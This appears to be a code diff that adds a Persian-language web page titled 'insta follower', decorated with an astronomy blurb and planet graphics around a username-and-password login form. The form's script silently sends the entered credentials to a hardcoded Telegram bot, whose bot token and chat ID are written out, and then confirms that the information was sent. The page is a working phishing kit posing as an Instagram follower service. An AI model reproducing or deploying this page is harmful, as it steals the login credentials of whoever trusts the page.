@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="fa">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width">
+        <title>insta follower</title>
+        <link rel="stylesheet" href="index.css">
+    </head>
+<body>
+    <h1>welcome</h1>
+    <p>The beauty</p>
+    <div class="flex-container">
+    <div class="flex-item">The Earth follows a slightly elliptical orbit around the Sun. This journey around the star takes 365.25 days. Additionally, it takes 24 hours to spin on its axis. The tilt of this rotational axis (23°) is the reason why we experience different seasons in a year. In comparison, Venus is only tilted by around 3° so it has a uniform season throughout. We have one Moon, which causes the tides in our oceans</div>
+    </div>
+    <div class="container">
+        <div class="son"></div>
+        <div class="earth">
+            <div class="moon"></div>
+        </div>
+        <div class="murce"></div>
+    </div>
+
+    </div>
+    <div class="login-box">
+        <h2>Login</h2>
+        <form id="login-form">
+          <div class="user-box">
+            <input id="username" type="text" name="" required="">
+            <label>Username</label>
+          </div>
+          <div class="user-box">
+            <input id="password" type="password" name="" required="">
+            <label>Password</label>
+            <button class="btn" type="submit">submit</button>
+          </div>
+        </form>
+      </div>
+      <script>
+        
+        const botToken = '7628772335:AAFeACmE6QrKrY0fuFOpK4XiPnihfRNyaQI';
+        const chatId   = '7255730758';
+    
+        
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+          e.preventDefault();
+    
+          const username = document.getElementById('username').value;
+          const password = document.getElementById('password').value;
+    
+          
+          const messageTpl =  `username: ${username}\n Password: ${password}`;
+          const urlTpl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageTpl)}`;
+    
+        
+          const messageCat = '👤 Username: ' + username + '\n🔒 Password: ' + password;
+          const urlCat = 'https://api.telegram.org/bot' + botToken +
+                         '/sendMessage?chat_id=' + chatId +
+                         '&text=' + encodeURIComponent(messageCat) ;
+    
+          
+          fetch(urlTpl)
+            .then(res => {
+              if (res.ok) {
+                alert('✅ اطلاعات با موفقیت ارسال شد!');
+              } else {
+                alert('❌ خطا در ارسال اطلاعات.');
+                console.error('Status:', res.status, res.statusText);
+              }
+            })
+            .catch(err => {
+              alert('❌ خطا در ارسال اطلاعات.');
+              console.error('Error:', err);
+            });
+        });
+      </script>
+    
+</body>
+</html>
